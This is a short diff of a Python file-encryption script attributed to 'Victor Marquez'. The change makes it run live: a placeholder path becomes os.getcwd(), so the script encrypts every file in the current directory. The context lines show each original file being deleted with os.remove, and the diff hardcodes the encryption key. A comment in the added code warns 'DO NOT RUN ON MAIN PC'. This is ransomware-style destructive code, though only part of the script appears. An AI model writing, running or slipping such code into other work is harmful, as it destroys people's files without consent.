@@ -5,7 +5,7 @@ The script encrypts and decrypts target files'
 
 """""
 _author_ = "Victor Marquez"
-_version_ =0.2
+_version_ =0.3
 
 import os
 from pathlib import Path
@@ -40,10 +40,10 @@ def encryptFile(file, Pkey,Path):
         f.close()
         os.remove(file)
 
+#WARNING! DO NOT RUN ON MAIN PC
+#This will encrypt all of the files in the current working directory
+path = os.getcwd()
 
-
-
-path = "Path where encrypted files are located"
 for file in detectFiles(path):
     filePath = Path(file)
-    encryptFile(filePath,b'Sixyeen byte key',path) #Key, script will not work if keys are not the same
+    encryptFile(filePath,b'KqhHot6KyYoImzC4',path)
